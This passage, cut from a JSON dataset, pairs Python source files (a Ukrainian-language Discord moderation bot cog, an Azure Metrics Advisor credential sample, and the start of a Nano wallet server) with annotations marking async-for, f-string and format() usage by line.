\u0431\u0456\u043b\u044c\u0448\u0435 100 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u044c! :bangbang:')\n            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)\n            await(await ctx.send(embed=embed)).delete(delay=50)\n        else:\n            messages = []\n            amount = int(amount)\n            async for message in channel.history(limit=amount):\n                    messages.append(message)\n            await channel.delete_messages(messages)\n            while amount in range (1,5) or amount in range (21,25) or amount in range (31,35) or amount in range (41,45) or amount in range (51,55) or amount in range (61,65) or amount in range (71,75) or amount in range (81,85) or amount in range (91,95):\n                await(await ctx.send(f'{amount} \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0432\u0438\u0434\u0430\u043b\u0435\u043d\u043e.')).delete(delay=15)\n                break\n            while amount in range(5,21) or amount in range(25,31) or amount in range(35,41) or amount in range(45,51) or amount in range(55,61) or amount in range(65,71) or amount in range(75,81) or amount in range(85,91) or amount in range(95,101):\n                await(await ctx.send(f'{amount} \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u044c \u0432\u0438\u0434\u0430\u043b\u0435\u043d\u043e.')).delete(delay=15)\n                break\n            if amount > 100:\n                await(await ctx.send(f'\u041f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u044c \u0432\u0438\u0434\u0430\u043b\u0435\u043d\u043e: {amount}.')).delete(delay=15)\ndef setup(bot):\n    bot.add_cog(Admin(bot))",
            "patterns": {
                "pep_567": [
                    [
                        5,
                        5,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        192,
                        193,
                        "async for",
                        "async for message in channel.history(limit=amount):\n                    messages.append(message)"
                    ]
                ],
                "pep_498": [
                    [
                        60,
                        "            message = f\"\u0412\u0430\u0441 \u0437\u0430\u0431\u043b\u043e\u043a\u0443\u0432\u0430\u043b\u0438 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0456 {ctx.guild.name} \u0437\u0430 {reason}\""
                    ],
                    [
                        89,
                        "            message = f\"\u0412\u0430\u0441 \u0432\u0438\u0433\u043d\u0430\u043b\u0438 \u0456\u0437 \u0441\u0435\u0440\u0432\u0435\u0440\u0443 {ctx.guild.name} \u0437\u0430 {reason}\""
                    ],
                    [
                        50,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0431\u043b\u043e\u043a\u0443\u0432\u0430\u0442\u0438 \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')"
                    ],
                    [
                        51,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        79,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u0438\u0433\u043d\u0430\u0442\u0438 \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')"
                    ],
                    [
                        80,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        109,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')"
                    ],
                    [
                        110,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        163,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0440\u043e\u0437\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')"
                    ],
                    [
                        164,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        186,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u0438\u0434\u0430\u043b\u0438\u0442\u0438 \u0431\u0456\u043b\u044c\u0448\u0435 100 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u044c! :bangbang:')"
                    ],
                    [
                        187,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        19,
                        "                embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0420\u043e\u043b\u044c \u0432\u0436\u0435 \u0456\u043d\u0443\u0454 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0456! :bangbang:')"
                    ],
                    [
                        20,
                        "                embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        27,
                        "                embed = discord.Embed(color=0xfc5821, title=f':white_check_mark: \u0421\u0442\u0432\u043e\u0440\u0435\u043d\u043e \u0440\u043e\u043b\u044c {role} :white_check_mark:')"
                    ],
                    [
                        28,
                        "                embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        54,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0431\u043b\u043e\u043a\u0443\u0432\u0430\u0442\u0438 \u0432\u043b\u0430\u0441\u043d\u0438\u043a\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')"
                    ],
                    [
                        55,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        64,
                        "            embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0437\u0430\u0431\u043b\u043e\u043a\u043e\u0432\u0430\u043d\u043e \u0437\u0430 {reason}!\", value=\"\u0421\u043f\u043e\u0434\u0456\u0432\u0430\u0454\u043c\u043e\u0441\u044c \u0446\u0435 \u0431\u0443\u0434\u0435 \u0443\u0440\u043e\u043a\u043e\u043c \u0434\u043b\u044f \u0440\u0435\u0448\u0442\u0438.\", inline=False)"
                    ],
                    [
                        65,
                        "            embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        83,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u0438\u0433\u043d\u0430\u0442\u0438 \u0432\u043b\u0430\u0441\u043d\u0438\u043a\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')"
                    ],
                    [
                        84,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        93,
                        "            embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0432\u0438\u043a\u043b\u044e\u0447\u0435\u043d\u043e \u0456\u0437 \u0441\u0435\u0440\u0432\u0435\u0440\u0443 \u0437\u0430 {reason}!\", value=\"\u0421\u043f\u043e\u0434\u0456\u0432\u0430\u0454\u043c\u043e\u0441\u044c \u0446\u0435 \u0431\u0443\u0434\u0435 \u0443\u0440\u043e\u043a\u043e\u043c \u0434\u043b\u044f \u0440\u0435\u0448\u0442\u0438.\", inline=False)"
                    ],
                    [
                        94,
                        "            embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        113,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u0432\u043b\u0430\u0441\u043d\u0438\u043a\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')"
                    ],
                    [
                        114,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        167,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0440\u043e\u0437\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u0432\u043b\u0430\u0441\u043d\u0438\u043a\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443! :bangbang:')"
                    ],
                    [
                        168,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        36,
                        "                    embed = discord.Embed(color=0xfc5821, title=f':negative_squared_cross_mark: \u0412\u0438\u0434\u0430\u043b\u0435\u043d\u043e \u0440\u043e\u043b\u044c {delrole} :negative_squared_cross_mark:')"
                    ],
                    [
                        37,
                        "                    embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        117,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u0412\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\u0435 \u0437\u0430\u0433\u043b\u0443\u0448\u0438\u0442\u0438 \u043a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430, \u044f\u043a\u0438\u0439 \u0432\u0436\u0435 \u0454 \u0437\u0430\u0433\u043b\u0443\u0448\u0435\u043d\u0438\u043c! :bangbang:')"
                    ],
                    [
                        118,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        140,
                        "            embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0437\u0430\u0433\u043b\u0443\u0448\u0435\u043d\u043e \u0437\u0430 {reason} \u043d\u0430 {time} {case}!\", value=\"\u0423\u0432\u0430\u0436\u043d\u043e \u043f\u0440\u043e\u0447\u0438\u0442\u0430\u0439\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0443.\", inline=False)"
                    ],
                    [
                        141,
                        "            embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        171,
                        "            embed = discord.Embed(color=0xfc5821, title=f':bangbang: \u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447 {member.name} \u043d\u0435 \u0454 \u0437\u0430\u0433\u043b\u0443\u0448\u0435\u043d\u0438\u043c \u043d\u0430 \u0434\u0430\u043d\u043e\u043c\u0443 \u0441\u0435\u0440\u0432\u0435\u0440\u0456! :bangbang:')"
                    ],
                    [
                        172,
                        "            embed.set_footer(text=f\"\u0421\u0438\u0441\u0442\u0435\u043c\u043d\u0435 \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0434\u043b\u044f {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        178,
                        "            embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0440\u043e\u0437\u0433\u043b\u0443\u0448\u0435\u043d\u043e\", value=\"\u0421\u043f\u043e\u0434\u0456\u0432\u0430\u0454\u043c\u043e\u0441\u044c \u0432\u0438 \u0443\u0441\u0432\u0456\u0434\u043e\u043c\u0438\u043b\u0438 \u0441\u0432\u043e\u044e \u043f\u043e\u043c\u0438\u043b\u043a\u0443.\", inline=False)"
                    ],
                    [
                        179,
                        "            embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        148,
                        "                embed.add_field(name=f\"\u041a\u043e\u0440\u0438\u0441\u0442\u0443\u0432\u0430\u0447\u0430 {member} \u0440\u043e\u0437\u0433\u043b\u0443\u0448\u0435\u043d\u043e\", value=\"\u0421\u043f\u043e\u0434\u0456\u0432\u0430\u0454\u043c\u043e\u0441\u044c \u0432\u0438 \u0443\u0441\u0432\u0456\u0434\u043e\u043c\u0438\u043b\u0438 \u0441\u0432\u043e\u044e \u043f\u043e\u043c\u0438\u043b\u043a\u0443.\", inline=False)"
                    ],
                    [
                        149,
                        "                embed.set_footer(text=f\"\u0412\u0438\u043a\u043b\u0438\u043a\u0430\u043d\u043e {ctx.author}\", icon_url=ctx.author.avatar_url)"
                    ],
                    [
                        196,
                        "                await(await ctx.send(f'{amount} \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u043d\u044f \u0432\u0438\u0434\u0430\u043b\u0435\u043d\u043e.')).delete(delay=15)"
                    ],
                    [
                        199,
                        "                await(await ctx.send(f'{amount} \u043f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u044c \u0432\u0438\u0434\u0430\u043b\u0435\u043d\u043e.')).delete(delay=15)"
                    ],
                    [
                        202,
                        "                await(await ctx.send(f'\u041f\u043e\u0432\u0456\u0434\u043e\u043c\u043b\u0435\u043d\u044c \u0432\u0438\u0434\u0430\u043b\u0435\u043d\u043e: {amount}.')).delete(delay=15)"
                    ]
                ]
            }
        },
        "40": {
            "file": "import os\nimport asyncio\nasync def sample_create_datasource_credential_async():\n    from azure.ai.metricsadvisor import MetricsAdvisorKeyCredential, MetricsAdvisorAdministrationClient\n    from azure.ai.metricsadvisor.models import DatasourceSqlConnectionString\n    service_endpoint = os.getenv(\"METRICS_ADVISOR_ENDPOINT\")\n    subscription_key = os.getenv(\"METRICS_ADVISOR_SUBSCRIPTION_KEY\")\n    api_key = os.getenv(\"METRICS_ADVISOR_API_KEY\")\n    connection_string = os.getenv(\"SQL_SERVER_CONNECTION_STRING\")\n    client = MetricsAdvisorAdministrationClient(service_endpoint,\n                                  MetricsAdvisorKeyCredential(subscription_key, api_key))\n    datasource_credential = await client.create_datasource_credential(\n        datasource_credential=DatasourceSqlConnectionString(\n            name=\"sql datasource credential\",\n            connection_string=connection_string,\n            description=\"my datasource credential\",\n        )\n    )\n    return datasource_credential\nasync def sample_get_datasource_credential_async(credential_id):\n    from azure.ai.metricsadvisor import MetricsAdvisorKeyCredential, MetricsAdvisorAdministrationClient\n    service_endpoint = os.getenv(\"METRICS_ADVISOR_ENDPOINT\")\n    subscription_key = os.getenv(\"METRICS_ADVISOR_SUBSCRIPTION_KEY\")\n    api_key = os.getenv(\"METRICS_ADVISOR_API_KEY\")\n    client = MetricsAdvisorAdministrationClient(service_endpoint,\n                                  MetricsAdvisorKeyCredential(subscription_key, api_key))\n    credential = await client.get_datasource_credential(credential_id)\n    print(\"Credential type: {}\".format(credential.credential_type))\n    print(\"Credential name: {}\".format(credential.name))\n    print(\"Description: {}\".format(credential.description))\nasync def sample_list_datasource_credentials_async():\n    from azure.ai.metricsadvisor import MetricsAdvisorKeyCredential, MetricsAdvisorAdministrationClient\n    service_endpoint = os.getenv(\"METRICS_ADVISOR_ENDPOINT\")\n    subscription_key = os.getenv(\"METRICS_ADVISOR_SUBSCRIPTION_KEY\")\n    api_key = os.getenv(\"METRICS_ADVISOR_API_KEY\")\n    client = MetricsAdvisorAdministrationClient(service_endpoint,\n                                  MetricsAdvisorKeyCredential(subscription_key, api_key))\n    credentials = client.list_datasource_credentials()\n    async for credential in credentials:\n        print(\"Credential type: {}\".format(credential.credential_type))\n        print(\"Credential name: {}\".format(credential.name))\n        print(\"Description: {}\\n\".format(credential.description))\nasync def sample_update_datasource_credential_async(datasource_credential):\n    from azure.ai.metricsadvisor import MetricsAdvisorKeyCredential, MetricsAdvisorAdministrationClient\n    service_endpoint = os.getenv(\"METRICS_ADVISOR_ENDPOINT\")\n    subscription_key = os.getenv(\"METRICS_ADVISOR_SUBSCRIPTION_KEY\")\n    api_key = os.getenv(\"METRICS_ADVISOR_API_KEY\")\n    client = MetricsAdvisorAdministrationClient(service_endpoint,\n                                  MetricsAdvisorKeyCredential(subscription_key, api_key))\n    datasource_credential.description = \"updated description\"\n    updated = await client.update_datasource_credential(datasource_credential)\n    print(\"Credential type: {}\".format(updated.credential_type))\n    print(\"Credential name: {}\".format(updated.name))\n    print(\"Description: {}\\n\".format(updated.description))\nasync def sample_delete_datasource_credential_async(credential_id):\n    from azure.core.exceptions import ResourceNotFoundError\n    from azure.ai.metricsadvisor import MetricsAdvisorKeyCredential, MetricsAdvisorAdministrationClient\n    service_endpoint = os.getenv(\"METRICS_ADVISOR_ENDPOINT\")\n    subscription_key = os.getenv(\"METRICS_ADVISOR_SUBSCRIPTION_KEY\")\n    api_key = os.getenv(\"METRICS_ADVISOR_API_KEY\")\n    client = MetricsAdvisorAdministrationClient(service_endpoint,\n                                  MetricsAdvisorKeyCredential(subscription_key, api_key))\n    await client.delete_datasource_credential(credential_id)\nasync def main():\n    print(\"---Creating datasource credential...\")\n    credential = await sample_create_datasource_credential_async()\n    print(\"Datasource credential successfully created...\")\n    print(\"\\n---Get a datasource credential...\")\n    await sample_get_datasource_credential_async(credential.id)\n    print(\"\\n---List datasource credentials...\")\n    await sample_list_datasource_credentials_async()\n    print(\"\\n---Update a datasource credential...\")\n    await sample_update_datasource_credential_async(credential)\n    print(\"\\n---Delete a datasource credential...\")\n    await sample_delete_datasource_credential_async(credential.id)\nif __name__ == '__main__':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        39,
                        42,
                        "async for",
                        "async for credential in credentials:\n        print(\"Credential type: {}\".format(credential.credential_type))\n        print(\"Credential name: {}\".format(credential.name))\n        print(\"Description: {}\\n\".format(credential.description))"
                    ]
                ],
                "pep_498v": [
                    [
                        28,
                        28,
                        ".format()"
                    ],
                    [
                        29,
                        29,
                        ".format()"
                    ],
                    [
                        30,
                        30,
                        ".format()"
                    ],
                    [
                        52,
                        52,
                        ".format()"
                    ],
                    [
                        53,
                        53,
                        ".format()"
                    ],
                    [
                        54,
                        54,
                        ".format()"
                    ],
                    [
                        40,
                        40,
                        ".format()"
                    ],
                    [
                        41,
                        41,
                        ".format()"
                    ],
                    [
                        42,
                        42,
                        ".format()"
                    ]
                ]
            }
        },
        "41": {
            "file": "from dotenv import load_dotenv\nload_dotenv()\nimport argparse\nimport asyncio\nimport ipaddress\nimport rapidjson as json\nimport logging\nimport os\nimport sys\nimport time\nimport uuid\nimport uvloop\nimport socketio\nfrom logging.handlers import TimedRotatingFileHandler, WatchedFileHandler\nimport aiofcm\nimport aioredis\nfrom aiohttp import ClientSession, WSMessage, WSMsgType, log, web\nfrom rpc import RPC, allowed_rpc_actions\nfrom util import Util\nfrom nano_websocket import WebsocketClient\nasyncio.set_event_loop_policy(uvloop.EventLoopPolicy())\nparser = argparse.ArgumentParser(description=\"Natrium/Kalium Wallet Server\")\nparser.add_argument('-b', '--banano', action='store_true', help='Run for BANANO (Kalium-mode)', default=False)\nparser.add_argument('--host', type=str, help='Host to listen on (e.g. 127.0.0.1)', default='127.0.0.1')\nparser.add_argument('--path', type=str, help='(Optional) Path to run application on (for unix socket, e.g. /tmp/natriumapp.sock', default=None)\nparser.add_argument('-p', '--port', type=int, help='Port to listen on', default=5076)\nparser.add_argument('-ws', '--websocket-url', type=str, help='Nano websocket URI', default='ws://[::1]:7078')\nparser.add_argument('--log-file', type=str, help='Log file location', default='natriumcast.log')\nparser.add_argument('--log-to-stdout', action='store_true', help='Log to stdout', default=False)\noptions = parser.parse_args()\ntry:\n    listen_host = str(ipaddress.ip_address(options.host))\n    listen_port = int(options.port)\n    redis_host = os.getenv('REDIS_HOST', 'localhost')\n    redis_port = 6379\n    log_file = options.log_file\n    app_path = options.path\n    if app_path is None:\n        server_desc = f'on {listen_host} port {listen_port}'\n    else:\n        server_desc = f'on {app_path}'\n    if options.banano:\n        banano_mode = True\n        print(f'Starting KALIUM Server (BANANO) {server_desc}')\n    else:\n        banano_mode = False\n        print(f'Starting NATRIUM Server (NANO) {server_desc}')\nexcept Exception as e:\n    parser.print_help()\n    sys.exit(0)\nprice_prefix = 'coingecko:nano' if not banano_mode else 'coingecko:banano'\nrpc_url = os.getenv('RPC_URL', 'http://[::1]:7076')\nwork_url = os.getenv('WORK_URL', None)\nfcm_api_key = os.getenv('FCM_API_KEY', None)\nfcm_sender_id = os.getenv('FCM_SENDER_ID', None)\ndebug_mode = True if int(os.getenv('DEBUG', 1)) != 0 else False\nloop = asyncio.get_event_loop()\nrpc = RPC(rpc_url, banano_mode, work_url=work_url, price_prefix=price_prefix)\nutil = Util(banano_mode)\ncurrency_list = [\"BTC\", \"ARS\", \"AUD\", \"BRL\", \"CAD\", \"CHF\", \"CLP\", \"CNY\", \"CZK\", \"DKK\", \"EUR\", \"GBP\", \"HKD\", \"HUF\", \"IDR\",\n                 \"ILS\", \"INR\", \"JPY\", \"KRW\", \"MXN\", \"MYR\", \"NOK\", \"NZD\", \"PHP\", \"PKR\", \"PLN\", \"RUB\", \"SEK\", \"SGD\",\n                 \"THB\", \"TRY\", \"TWD\", \"USD\", \"VES\", \"ZAR\", \"SAR\", \"AED\", \"KWD\"]\nasync def delete_fcm_token_for_account(account : str, token : str, r : web.Request):\n    await r.app['rdata'].delete(token)\nasync def update_fcm_token_for_account(account : str, token : str, r : web.Request, v2 : bool = False):\n    redisInst = r.app['rdata']\n    await set_or_upgrade_token_account_list(account, token, r, v2=v2)\n    cur_list = await redisInst.get(account)\n    if cur_list is not None:\n        cur_list = json.loads(cur_list.replace('\\'', '\"'))\n    else:\n        cur_list = {}\n    if 'data' not in cur_list:\n        cur_list['data'] = []\n    if token not in cur_list['data']:\n        cur_list['data'].append(token)\n    await redisInst.set(account, json.dumps(cur_list))\nasync def get_or_upgrade_token_account_list(account : str, token : str, r : web.Request, v2 : bool = False) -> list:\n    redisInst = r.app['rdata']\n    curTokenList = await redisInst.get(token)\n    if curTokenList is None:\n        return []\n    else:\n        try:\n            curToken = json.loads(curTokenList)\n            return curToken\n        except Exception:\n            curToken = curTokenList\n            await redisInst.set(token, json.dumps([curToken]), expire=2592000)\n            if account != curToken:\n                return []\n    return json.loads(await redisInst.get(token))\nasync def set_or_upgrade_token_account_list(account : str, token : str, r : web.Request, v2 : bool = False) -> list:\n    redisInst = r.app['rdata']\n    curTokenList = await redisInst.get(token)\n    if curTokenList is None:\n        await redisInst.set(token, json.dumps([account]), expire=2592000) \n    else:\n        try:\n            curToken = json.loads(curTokenList)\n            if account not in curToken:\n                curToken.append(account)\n                await redisInst.set(token, json.dumps(curToken), expire=2592000)\n        except Exception as e:\n            curToken = curTokenList\n            await redisInst.set(token, json.dumps([curToken]), expire=2592000)\n    return json.loads(await redisInst.get(token))\nasync def get_fcm_tokens(account : str, r : web.Request, v2 : bool = False) -> list:\n    redisInst = r.app['rdata']\n    tokens = await redisInst.get(account)\n    if tokens is None:\n        return []\n    tokens = json.loads(tokens.replace('\\'', '\"'))\n    new_token_list = {}\n    new_token_list['data'] = []\n    if 'data' not in tokens:\n        return []\n    for t in tokens['data']:\n        account_list = await get_or_upgrade_token_account_list(account, t, r, v2=v2)\n        if account not in account_list:\n            continue\n        new_token_list['data'].append(t)\n    await redisInst.set(account, json.dumps(new_token_list))\n    return new_token_list['data']\nasync def handle_user_message(r : web.Request, message : str, ws : web.WebSocketResponse = None):\n    address = util.get_request_ip(r)\n    uid = ws.id if ws is not None else '0'\n    now = int(round(time.time() * 1000))\n    if address in r.app['last_msg']:\n        if (now - r.app['last_msg'][address]['last']) < 25:\n            if r.app['last_msg'][address]['count'] > 3:\n                log.server_logger.error('client messaging too quickly: %s ms; %s; %s; User-Agent: %s', str(\n                    now - r.app['last_msg'][address]['last']), address, uid, str(\n                    r.headers.get('User-Agent')))\n                return None\n            else:\n                r.app['last_msg'][address]['count'] += 1\n        else:\n            r.app['last_msg'][address]['count'] = 0\n    else:\n        r.app['last_msg'][address] = {}\n        r.app['last_msg'][address]['count'] = 0\n    r.app['last_msg'][address]['last'] = now\n    log.server_logger.info('request; %s, %s, %s', message, address, uid)\n    if message not in r.app['active_messages']:\n        r.app['active_messages'].add(message)\n    else:\n        log.server_logger.error('request already active; %s; %s; %s', message, address, uid)\n        return None\n    ret = None\n    try:\n        request_json = json.loads(message)\n        if request_json['action'] in allowed_rpc_actions:\n            if 'request_id' in request_json:\n                requestid = request_json['request_id']\n            else:\n                requestid = None\n            if 'count' in request_json:\n                if (request_json['count'] < 0) or (request_json['count'] > 3500):\n                    request_json['count'] = 3500\n            if request_json['action'] == \"account_subscribe\" and ws is not None:\n                resubscribe = True\n                if 'uuid' in request_json:\n                    account = await r.app['rdata'].hget(request_json['uuid'], \"account\")\n                    if account is None:\n                        resubscribe = False\n                    else:\n                        try:\n                            account_list = json.loads(account)\n                            if 'account' in request_json and request_json['account'].lower() not in account_list:\n                                account_list.append(request_json['account'].lower())\n                                await r.app['rdata'].hset(request_json['uuid'], \"account\", json.dumps(account_list))\n                        except Exception:\n                            if 'account' in request_json and request_json['account'].lower() != account.lower():\n                                resubscribe = False\n                            else:\n                                account_list = []\n                                account_list.append(account.lower())\n                                await r.app['rdata'].hset(request_json['uuid'], \"account\", json.dumps(account_list))\n                if 'uuid' in request_json and resubscribe:\n                    if uid in r.app['clients']:\n                        del r.app['clients'][uid]\n                    uid = request_json['uuid']\n                    ws.id = uid\n                    r.app['clients'][uid] = ws\n                    log.server_logger.info('reconnection request;' + address + ';' + uid)\n                    try:\n                        if 'currency' in request_json and request_json['currency'] in currency_list:\n                            currency = request_json['currency']\n                            r.app['cur_prefs'][uid] = currency\n                            await r.app['rdata'].hset(uid, \"currency\", currency)\n                        else:\n                            setting = await r.app['rdata'].hget(uid, \"currency\")\n                            if setting is not None:\n                                r.app['cur_prefs'][uid] = setting\n                            else:\n                                r.app['cur_prefs'][uid] = 'usd'\n                                await r.app['rdata'].hset(uid, \"currency\", 'usd')\n                        account_list = json.loads(await r.app['rdata'].hget(uid, \"account\"))\n                        if 'account' in request_json:\n                            account = request_json['account']\n                        else:\n                            account = account_list[0]\n                        if account.replace(\"nano_\", \"xrb_\") in account_list:\n                            account_list.remove(account.replace(\"nano_\", \"xrb_\"))\n                            account = account.replace('xrb_', 'nano_')\n                            account_list.append(account)\n                            await r.app['rdata'].hset(uid, \"account\", json.dumps(account_list))\n                        await 